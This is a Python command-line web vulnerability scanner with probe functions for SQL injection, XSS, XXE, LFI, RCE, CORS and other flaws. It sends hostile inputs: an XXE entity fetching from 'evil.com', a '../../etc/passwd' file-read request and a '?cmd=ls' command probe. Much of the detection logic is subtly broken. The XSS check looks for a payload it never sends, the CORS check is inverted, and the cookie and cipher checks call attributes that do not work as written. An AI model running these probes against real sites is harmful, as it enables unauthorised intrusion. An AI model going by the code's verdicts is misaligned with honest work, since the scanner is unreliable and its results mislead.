import argparse
import requests
from bs4 import BeautifulSoup

def test_sqli(url, query):
    """
    Tests for SQL injection vulnerabilities in a web application.
    """
    try:
        response = requests.get(url + "?query=" + query)
        response.raise_for_status()
        if "SQL syntax error" in response.text:
            print("SQL Injection Vulnerability Detected!")
        else:
            print("No SQL Injection Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for SQL injection vulnerability:", e)

def test_file_inclusion(url, file_path):
    """
    Tests for file inclusion vulnerabilities in a web application.
    """
    try:
        response = requests.get(url + "?file=" + file_path)
        response.raise_for_status()
        if "No such file or directory" in response.text:
            print("File Inclusion Vulnerability Detected!")
        else:
            print("No File Inclusion Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for file inclusion vulnerability:", e)

def test_xss(url):
    """
    Tests for Cross-Site Scripting (XSS) vulnerabilities in a web application.
    """
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "<script>alert('XSS Test')</script>" in response.text:
            print("XSS Vulnerability Detected!")
        else:
            print("No XSS Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for XSS vulnerability:", e)

def test_command_injection(url, command):
    """
    Tests for Command Injection vulnerabilities in a web application.
    """
    try:
        response = requests.get(url + "?cmd=" + command)
        response.raise_for_status()
        if "command not found" in response.text:
            print("Command Injection Vulnerability Detected!")
        else:
            print("No Command Injection Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for Command Injection vulnerability:", e)

def test_cors(url):
    """
    Tests for Cross-Origin Resource Sharing (CORS) misconfiguration vulnerabilities in a web application.
    """
    try:
        response = requests.options(url)
        response.raise_for_status()
        if "Access-Control-Allow-Origin" not in response.headers:
            print("CORS Misconfiguration Vulnerability Detected!")
        else:
            print("No CORS Misconfiguration Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for CORS misconfiguration vulnerability:", e)

def test_insecure_cookies(url):
    """
    Tests for insecure cookie settings in a web application.
    """
    try:
        response = requests.get(url)
        response.raise_for_status()
        cookies = response.cookies
        if not cookies.secure:
            print("Insecure Cookies Vulnerability Detected!")
        else:
            print("No Insecure Cookies Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for insecure cookies vulnerability:", e)

def test_weak_cipher(url):
    """
    Tests for weak SSL/TLS cipher suites in a web application.
    """
    try:
        response = requests.get(url)
        response.raise_for_status()
        cipher = response.connection.cipher()
        if cipher and cipher[0] == "RC4":
            print("Weak SSL/TLS Cipher Suites Vulnerability Detected!")
        else:
            print("No Weak SSL/TLS Cipher Suites Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for weak SSL/TLS cipher vulnerability:", e)

def test_ssrf(url):
    """
    Tests for Server-Side Request Forgery (SSRF) vulnerabilities in a web application.
    """
    try:
        response = requests.get(url)
        response.raise_for_status()
        if "Internal Server Error" in response.text:
            print("SSRF Vulnerability Detected!")
        else:
            print("No SSRF Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for SSRF vulnerability:", e)

def test_xxe(url):
    """
    Tests for XML External Entity (XXE) injection vulnerabilities in a web application.
    """
    try:
        response = requests.post(url, data="<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><foo>&xxe;</foo>")
        response.raise_for_status()
        if "XXE Test" in response.text:
            print("XXE Vulnerability Detected!")
        else:
            print("No XXE Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for XXE vulnerability:", e)

def test_dir_traversal(url, file_path):
    """
    Tests for Directory Traversal vulnerabilities in a web application.
    """
    try:
        response = requests.get(url + "?file=" + file_path)
        response.raise_for_status()
        if "Directory Traversal Detected" in response.text:
            print("Directory Traversal Vulnerability Detected!")
        else:
            print("No Directory Traversal Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for Directory Traversal vulnerability:", e)

def test_idor(url):
    """
    Tests for Insecure Direct Object Reference (IDOR) vulnerabilities in a web application.
    """
    try:
        response = requests.get(url + "/profile")
        response.raise_for_status()
        if "Unauthorized Access" in response.text:
            print("IDOR Vulnerability Detected!")
        else:
            print("No IDOR Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for IDOR vulnerability:", e)

def test_lfi(url):
    """
    Tests for Local File Inclusion (LFI) vulnerabilities in a web application.
    """
    try:
        response = requests.get(url + "?file=../../etc/passwd")
        response.raise_for_status()
        if "root:x" in response.text:
            print("LFI Vulnerability Detected!")
        else:
            print("No LFI Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for LFI vulnerability:", e)

def test_rce(url):
    """
    Tests for Remote Code Execution (RCE) vulnerabilities in a web application.
    """
    try:
        response = requests.get(url + "?cmd=ls")
        response.raise_for_status()
        if "index.html" in response.text:
            print("RCE Vulnerability Detected!")
        else:
            print("No RCE Vulnerability Detected.")
    except requests.exceptions.RequestException as e:
        print("Error testing for RCE vulnerability:", e)

def main():
    parser = argparse.ArgumentParser(description="Command Line Interface for Web Vulnerability Testing")
    parser.add_argument("url", help="URL of the web application to test")
    parser.add_argument("--sqli", metavar="QUERY", help="Test for SQL injection vulnerability with the specified query")
    parser.add_argument("--file-inclusion", metavar="FILE_PATH", help="Test for file inclusion vulnerability with the specified file path")
    parser.add_argument("--xss", action="store_true", help="Test for Cross-Site Scripting (XSS) vulnerability")
    parser.add_argument("--command-injection", metavar="COMMAND", help="Test for Command Injection vulnerability with the specified command")
    parser.add_argument("--cors", action="store_true", help="Test for Cross-Origin Resource Sharing (CORS) misconfiguration vulnerability")
    parser.add_argument("--insecure-cookies", action="store_true", help="Test for insecure cookies vulnerability")
    parser.add_argument("--weak-cipher", action="store_true", help="Test for weak SSL/TLS cipher suites vulnerability")
    parser.add_argument("--ssrf", action="store_true", help="Test for Server-Side Request Forgery (SSRF) vulnerability")
    parser.add_argument("--xxe", action="store_true", help="Test for XML External Entity (XXE) injection vulnerability")
    parser.add_argument("--dir-traversal", metavar="FILE_PATH", help="Test for Directory Traversal vulnerability with the specified file path")
    parser.add_argument("--idor", action="store_true", help="Test for Insecure Direct Object Reference (IDOR) vulnerability")
    parser.add_argument("--lfi", action="store_true", help="Test for Local File Inclusion (LFI) vulnerability")
    parser.add_argument("--rce", action="store_true", help="Test for Remote Code Execution (RCE) vulnerability")

    args = parser.parse_args()

    if args.sqli:
        print("Testing for SQL injection vulnerability...")
        test_sqli(args.url, args.sqli)

    if args.file_inclusion:
        print("Testing for file inclusion vulnerability...")
        test_file_inclusion(args.url, args.file_inclusion)

    if args.xss:
        print("Testing for Cross-Site Scripting (XSS) vulnerability...")
        test_xss(args.url)

    if args.command_injection:
        print("Testing for Command Injection vulnerability...")
        test_command_injection(args.url, args.command_injection)

    if args.cors:
        print("Testing for Cross-Origin Resource Sharing (CORS) misconfiguration vulnerability...")
        test_cors(args.url)

    if args.insecure_cookies:
        print("Testing for insecure cookies vulnerability...")
        test_insecure_cookies(args.url)

    if args.weak_cipher:
        print("Testing for weak SSL/TLS cipher suites vulnerability...")
        test_weak_cipher(args.url)

    if args.ssrf:
        print("Testing for Server-Side Request Forgery (SSRF) vulnerability...")
        test_ssrf(args.url)

    if args.xxe:
        print("Testing for XML External Entity (XXE) injection vulnerability...")
        test_xxe(args.url)

    if args.dir_traversal:
        print("Testing for Directory Traversal vulnerability...")
        test_dir_traversal(args.url, args.dir_traversal)

    if args.idor:
        print("Testing for Insecure Direct Object Reference (IDOR) vulnerability...")
        test_idor(args.url)

    if args.lfi:
        print("Testing for Local File Inclusion (LFI) vulnerability...")
        test_lfi(args.url)

    if args.rce:
        print("Testing for Remote Code Execution (RCE) vulnerability...")
        test_rce(args.url)

if __name__ == "__main__":
    main()
